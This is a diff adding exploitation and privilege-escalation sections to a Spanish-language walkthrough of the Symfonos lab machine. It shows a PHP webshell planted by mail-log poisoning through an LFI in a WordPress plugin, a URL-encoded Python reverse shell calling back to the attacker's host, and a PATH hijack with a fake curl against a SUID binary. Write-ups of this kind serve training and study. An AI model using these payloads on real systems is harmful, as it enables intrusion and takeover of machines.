@@ -792,6 +792,110 @@ Interesting Finding(s):
 - Sólo identifiqué el hash del usuario "admin". 
 
 
+## 5. Explotando Vulnerabilidades
+
+### 5.1. Explotando LOCAL FILE INCLUSION (LFI)
+
+- En mi experiencia LFI tiene dos (02) posibles caminos para explotarla:
+1. Poisoning de algun archivo LOG (apache, smtp, etc), luego se ejecuta el archivo y tenemos una webshell.
+2. Buscar archivos con información sensible que permitan identificar alguna contraseña o configuración importante.
+
+- En la búsqueda de los archivos que podríamos POISONEAR, encontramos el siguiente: /var/mail/helios
+- Por teoría debemos saber que en la carpeta /var/mail se encuentran los correos electrónicos de los usuarios del sistema operativo. Entonces, debemos añadir código PHP en ese archivo y luego ejecutarlo. 
+
+```
+root@kali:/var/www/html# nc 10.10.10.150 25
+220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+MAIL FROM: <elpalomo>
+250 2.1.0 Ok
+RCPT TO: helios
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+<?php system($_GET['cmd']); ?>
+.
+250 2.0.0 Ok: queued as BAF1E406A6
+```
+
+<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos12.jpg" with=80% />
+
+<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos13.jpg" with=80% />
+
+> Finalmente, ahora que ya podemos ejecutar comandos a nivel del sistema operativo, obtenemos SHELL REMOTA.
+
+```
+/*En el nevagador*/
+http://10.10.10.150/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.10.133%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+
+/*en la consola de KALI*/
+root@kali:~/SYMFONOS# netcat -lvp 443 
+Connection from 10.10.10.150:49298
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+<h3l105/wp-content/plugins/mail-masta/inc/campaign$ whoami
+whoami
+helios
+<h3l105/wp-content/plugins/mail-masta/inc/campaign$ 
+```
+
+<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos14.jpg" with=80% />
+
+
+## 6. Elevando Privilegios
+
+- Se deben probar todas las posibles técnicas para elevar privilegios, esta vez el SETUID nos brinda algo diferente.
+
+```
+<h3l105/wp-content/plugins/mail-masta/inc/campaign$ find / -perm -u=s -type f 2>/dev/null
+<inc/campaign$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/opt/statuscheck
+/bin/mount
+/bin/umount
+/bin/su
+/bin/ping
+```
+
+<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos15.jpg" with=80% />
+
+- Resalta un archivo fuera de lo convencional: /opt/statuscheck
+
+- Al ejecutar y analizar el contenido del archivo podemos notar que ejecuta el comando CURL a nivel de localhost.
+
+<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos16.jpg" with=80% />
+
+- No podemos editar el archivo para manipular la conexión, sin embargo, lo que podemos hacer es crear un CURL falso y modificar el PATH de ejecución para que el archivo /opt/statuscheck (que se ejecuta como root) llame a un CURL falso y que también se ejecute como ROOT. Aquí el ejemplo:
+
+```
+<h3l105/wp-content/plugins/mail-masta/inc/campaign$ cd /tmp
+cd /tmp
+helios@symfonos:/tmp$ rm -f curl
+rm -f curl
+helios@symfonos:/tmp$ echo "/bin/sh" > curl
+echo "/bin/sh" > curl
+helios@symfonos:/tmp$ chmod 777 curl
+chmod 777 curl
+helios@symfonos:/tmp$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+helios@symfonos:/tmp$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+```
+
+- Ahora llamar al script /opt/statuscheck y este llamara al CURL falso como ROOT y obtendremos consola.
+
+
+<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos17.jpg" with=80% />
+
+
 
 
 
